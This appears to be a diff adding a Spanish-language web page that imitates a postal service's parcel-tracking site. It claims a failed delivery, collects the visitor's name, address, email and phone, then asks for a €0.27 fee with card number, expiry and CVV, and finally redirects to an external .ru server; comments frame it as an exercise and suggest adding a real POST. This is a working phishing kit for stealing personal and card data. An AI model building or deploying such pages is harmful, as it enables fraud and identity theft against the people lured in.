@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <title>Seguimiento de envío - Servicio Postal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <style>
+        /* ===== Reset básico ===== */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html, body {
+            height: 100%;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
+                         Roboto, sans-serif;
+            background: #f3f4f6;
+            color: #111827;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+        }
+
+        #app {
+            width: 100%;
+            max-width: 960px;
+            min-height: 100vh;
+            background: #ffffff;
+            box-shadow: 0 0 25px rgba(15, 23, 42, 0.1);
+        }
+
+        /* ===== Top bar imitanto cabecera mobile / web ===== */
+        .topbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 8px 16px;
+            background: #ffcc00;
+        }
+
+        .topbar-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .brand-logo {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #002a5c;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ffcc00;
+            font-weight: 700;
+            font-size: 18px;
+        }
+
+        .menu-icon {
+            width: 24px;
+            height: 24px;
+            border: none;
+            background: transparent;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            gap: 4px;
+            cursor: pointer;
+        }
+
+        .menu-icon span {
+            display: block;
+            width: 18px;
+            height: 2px;
+            background: #111827;
+        }
+
+        .topbar-right {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 12px;
+        }
+
+        .topbar-right a {
+            color: #111827;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .topbar-right a:hover {
+            text-decoration: underline;
+        }
+
+        /* ===== Layout principal (móvil first) ===== */
+        .content {
+            padding: 12px 12px 32px;
+        }
+
+        @media (min-width: 768px) {
+            .content {
+                padding: 24px 32px 40px;
+            }
+        }
+
+        /* ===== Secciones SPA (steps) ===== */
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        /* ===== STEP 1: Seguimiento ===== */
+
+        .hero-tracking {
+            background: #ffcc00;
+            border-radius: 12px;
+            overflow: hidden;
+            padding: 24px 16px;
+            margin-bottom: 16px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .hero-tracking-inner {
+            max-width: 320px;
+            text-align: center;
+        }
+
+        .hero-img {
+            width: 100%;
+            max-width: 260px;
+            margin: 0 auto 16px;
+        }
+
+        .hero-img img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .hero-tracking-title {
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .tracking-card {
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(15, 23, 42, 0.06);
+            padding: 16px 16px 10px;
+            margin-bottom: 16px;
+        }
+
+        .tracking-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+
+        .tracking-header-icon {
+            font-size: 18px;
+        }
+
+        .tracking-header-title {
+            font-weight: 600;
+        }
+
+        .tracking-number {
+            font-size: 12px;
+            color: #4b5563;
+        }
+
+        .tracking-number strong {
+            display: block;
+            font-size: 13px;
+            color: #111827;
+            margin-top: 2px;
+        }
+
+        /* Estados de envío */
+        .status-row {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 12px;
+            font-size: 11px;
+        }
+
+        .status-item {
+            text-align: center;
+            flex: 1;
+        }
+
+        .status-item:not(:last-child) {
+            border-right: 1px solid #e5e7eb;
+        }
+
+        .status-icon {
+            width: 18px;
+            height: 18px;
+            border-radius: 999px;
+            border: 2px solid #10b981;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            color: #10b981;
+            margin-bottom: 4px;
+        }
+
+        .status-icon.pending {
+            border-color: #f59e0b;
+            color: #f59e0b;
+        }
+
+        .status-label {
+            display: block;
+        }
+
+        /* Aviso de falla */
+        .warning-card {
+            margin-top: 20px;
+            border-radius: 8px;
+            border: 1px solid #bfdbfe;
+            background: #eff6ff;
+            padding: 12px 12px 14px;
+            font-size: 12px;
+        }
+
+        .warning-title {
+            font-weight: 600;
+            color: #1d4ed8;
+            margin-bottom: 6px;
+        }
+
+        .warning-body {
+            color: #374151;
+        }
+
+        .btn-primary {
+            margin-top: 12px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 10px 18px;
+            border-radius: 6px;
+            border: none;
+            background: #ffcc00;
+            color: #111827;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(251, 191, 36, 0.4);
+        }
+
+        .btn-primary:hover {
+            filter: brightness(0.96);
+        }
+
+        /* ===== Titles comunes ===== */
+        .page-title {
+            font-size: 22px;
+            margin-bottom: 6px;
+            color: #111827;
+        }
+
+        .page-subtitle {
+            font-size: 14px;
+            color: #4b5563;
+            margin-bottom: 16px;
+        }
+
+        /* ===== Cards genéricas ===== */
+        .card {
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(15, 23, 42, 0.06);
+            padding: 18px 16px 20px;
+        }
+
+        @media (min-width: 768px) {
+            .card {
+                padding: 22px 22px 24px;
+            }
+        }
+
+        /* ===== Form genérico ===== */
+        .form-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .field {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .field label {
+            font-size: 12px;
+            font-weight: 500;
+            color: #374151;
+        }
+
+        .field input {
+            padding: 9px 10px;
+            border-radius: 6px;
+            border: 1px solid #d1d5db;
+            background: #f3f4f6;
+            font-size: 13px;
+            outline: none;
+            transition: border-color 0.12s ease, box-shadow 0.12s ease;
+        }
+
+        .field input:focus {
+            border-color: #f59e0b;
+            box-shadow: 0 0 0 1px rgba(245, 158, 11, 0.4);
+            background: #ffffff;
+        }
+
+        .form-row {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        @media (min-width: 640px) {
+            .form-row.two {
+                flex-direction: row;
+            }
+
+            .form-row.two > .field {
+                flex: 1;
+            }
+        }
+
+        .hint {
+            font-size: 11px;
+            color: #9ca3af;
+        }
+
+        /* ===== STEP 3: pago ===== */
+        .amount-line {
+            margin: 4px 0 16px;
+            font-size: 14px;
+        }
+
+        .amount-line strong {
+            font-weight: 600;
+        }
+
+        .radio-title {
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .card-logos {
+            font-size: 12px;
+            color: #6b7280;
+            margin-bottom: 10px;
+        }
+
+        .card-logos span {
+            display: inline-block;
+            padding: 2px 4px;
+            margin-right: 4px;
+            border-radius: 3px;
+            border: 1px solid #e5e7eb;
+            background: #ffffff;
+        }
+
+        .btn-primary.full {
+            width: 100%;
+            justify-content: center;
+        }
+
+        /* ===== Overlay “verificando…” ===== */
+        .overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(243, 244, 246, 0.9);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 40;
+        }
+
+        .overlay.visible {
+            display: flex;
+        }
+
+        .overlay-box {
+            background: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(15, 23, 42, 0.18);
+            padding: 18px 22px;
+            text-align: center;
+            max-width: 260px;
+        }
+
+        .spinner {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            border: 3px solid #e5e7eb;
+            border-top-color: #f59e0b;
+            margin: 0 auto 12px;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .overlay-title {
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+
+        .overlay-text {
+            font-size: 12px;
+            color: #4b5563;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+<div id="app">
+    <!-- Cabecera común -->
+    <header class="topbar">
+        <div class="topbar-left">
+            <div class="brand-logo">SP</div>
+            <button class="menu-icon" type="button" aria-label="Menú">
+                <span></span><span></span><span></span>
+            </button>
+        </div>
+        <div class="topbar-right">
+            <a href="#"><span>Área cliente</span></a>
+            <span>|</span>
+            <a href="#"><span>👤</span></a>
+        </div>
+    </header>
+
+    <main class="content">
+        <!-- ===== STEP 1: Seguimiento ===== -->
+        <section id="step-tracking" class="step active">
+            <div class="hero-tracking">
+                <div class="hero-tracking-inner">
+                    <div class="hero-img">
+                        <!-- Sustituye la ruta por tu imagen real -->
+                        <img src="img/hero-delivery.png" alt="Repartidor con paquetes">
+                    </div>
+                    <div class="hero-tracking-title">
+                        Sigue tu envío
+                    </div>
+                </div>
+            </div>
+
+            <div class="tracking-card">
+                <div class="tracking-header">
+                    <div class="tracking-header-icon">📦</div>
+                    <div>
+                        <div class="tracking-header-title">Sigue tu envío</div>
+                        <div class="tracking-number">
+                            Nº de seguimiento de envío
+                            <strong>PH9VMC0759 767210146026M</strong>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="status-row">
+                    <div class="status-item">
+                        <div class="status-icon">✓</div>
+                        <span class="status-label">Preadmisión</span>
+                    </div>
+                    <div class="status-item">
+                        <div class="status-icon">✓</div>
+                        <span class="status-label">En camino</span>
+                    </div>
+                    <div class="status-item">
+                        <div class="status-icon pending">!</div>
+                        <span class="status-label">En entrega</span>
+                    </div>
+                    <div class="status-item">
+                        <div class="status-icon pending">□</div>
+                        <span class="status-label">Entregado</span>
+                    </div>
+                </div>
+
+                <div class="warning-card">
+                    <div class="warning-title">Aviso de falla de entrega</div>
+                    <div class="warning-body">
+                        Debido a un problema con la dirección de entrega, su paquete no
+                        pudo ser entregado. Por favor, actualice la información de
+                        envío para programar una nueva entrega.
+                    </div>
+
+                    <button class="btn-primary" type="button" onclick="goToStep('address')">
+                        Actualizar dirección
+                    </button>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===== STEP 2: Dirección de envío ===== -->
+        <section id="step-address" class="step">
+            <h1 class="page-title">Dirección de envío</h1>
+            <p class="page-subtitle">
+                Estimado usuario, complete cuidadosamente el formulario para
+                garantizar la entrega exitosa.
+            </p>
+
+            <div class="card">
+                <form id="address-form">
+                    <div class="form-grid">
+                        <div class="field">
+                            <label for="fullName">Su Nombre</label>
+                            <input id="fullName" name="fullName" type="text" required>
+                        </div>
+
+                        <div class="field">
+                            <label for="addressLine">DIRECCIÓN</label>
+                            <input id="addressLine" name="addressLine" type="text" required>
+                        </div>
+
+                        <div class="field">
+                            <label for="city">Ciudad</label>
+                            <input id="city" name="city" type="text" required>
+                        </div>
+
+                        <div class="field">
+                            <label for="state">Estado / Provincia / Región</label>
+                            <input id="state" name="state" type="text" required>
+                        </div>
+
+                        <div class="field">
+                            <label for="postalCode">Código Postal</label>
+                            <input id="postalCode" name="postalCode" type="text" required>
+                        </div>
+
+                        <div class="field">
+                            <label for="email">Correo Electrónico</label>
+                            <input id="email" name="email" type="email" required>
+                        </div>
+
+                        <div class="field">
+                            <label for="phone">Número de Teléfono</label>
+                            <input id="phone" name="phone" type="tel" required>
+                        </div>
+                    </div>
+
+                    <button class="btn-primary full" type="submit">
+                        Continuar al pago
+                    </button>
+
+                    <p class="hint">
+                        Esta información se utilizará únicamente para completar la entrega.
+                    </p>
+                </form>
+            </div>
+        </section>
+
+        <!-- ===== STEP 3: Pago en línea ===== -->
+        <section id="step-payment" class="step">
+            <h1 class="page-title">Pago en línea</h1>
+            <p class="page-subtitle">
+                Para la entrega, necesitamos cobrar algunas tarifas de servicio.
+                Su paquete se volverá a enviar después del pago.
+            </p>
+
+            <p class="amount-line">
+                Suma global: <strong>€0.27</strong>
+            </p>
+
+            <div class="card">
+                <div class="radio-title">Tarjeta de crédito o débito</div>
+                <div class="card-logos">
+                    <span>VISA</span>
+                    <span>Mastercard</span>
+                    <span>Maestro</span>
+                    <span>Amex</span>
+                </div>
+
+                <form id="payment-form">
+                    <div class="form-grid">
+                        <div class="field">
+                            <label for="cardName">Titular de la tarjeta</label>
+                            <input id="cardName" name="cardName" type="text" required>
+                        </div>
+
+                        <div class="field">
+                            <label for="cardNumber">Número de tarjeta</label>
+                            <input id="cardNumber" name="cardNumber" type="text" placeholder="0000 0000 0000 0000" required>
+                        </div>
+
+                        <div class="form-row two">
+                            <div class="field">
+                                <label for="expiry">Fecha de caducidad</label>
+                                <input id="expiry" name="expiry" type="text" placeholder="MM/YY" required>
+                            </div>
+                            <div class="field">
+                                <label for="cvv">CVV</label>
+                                <input id="cvv" name="cvv" type="password" placeholder="123" required>
+                            </div>
+                        </div>
+                    </div>
+
+                    <button class="btn-primary full" type="submit">
+                        Entregar
+                    </button>
+                </form>
+            </div>
+        </section>
+    </main>
+
+    <!-- Overlay de “verificando…” -->
+    <div id="overlay" class="overlay" aria-hidden="true">
+        <div class="overlay-box">
+            <div class="spinner"></div>
+            <div class="overlay-title">Tu información está siendo verificada…</div>
+            <div class="overlay-text">
+                Por favor no cierres la página.
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Navegación simple entre pasos (SPA sin recarga)
+    function goToStep(stepId) {
+        document.querySelectorAll('.step').forEach(s => {
+            s.classList.remove('active');
+        });
+        document.getElementById('step-' + stepId).classList.add('active');
+        window.scrollTo(0, 0);
+    }
+
+    // Paso 1 -> Paso 2 (ya está conectado al botón en HTML)
+
+    // Paso 2 -> Paso 3
+    document.getElementById('address-form').addEventListener('submit', function (e) {
+        e.preventDefault(); // no hacemos POST real aquí
+        goToStep('payment');
+    });
+
+    // Paso 3 -> overlay + “muerte” en una URL dummy
+    document.getElementById('payment-form').addEventListener('submit', function (e) {
+        e.preventDefault(); // evitamos envío real para el ejercicio 30
+        const overlay = document.getElementById('overlay');
+        overlay.classList.add('visible');
+
+        // Simula verificación y luego redirige.
+        // Para el ejercicio 31 puedes cambiar esto por un POST real.
+        setTimeout(function () {
+            window.location.href = 'http://srv223049.hoster-test.ru/cas/corr/infos.php';
+        }, 3000);
+    });
+</script>
+</body>
+</html>
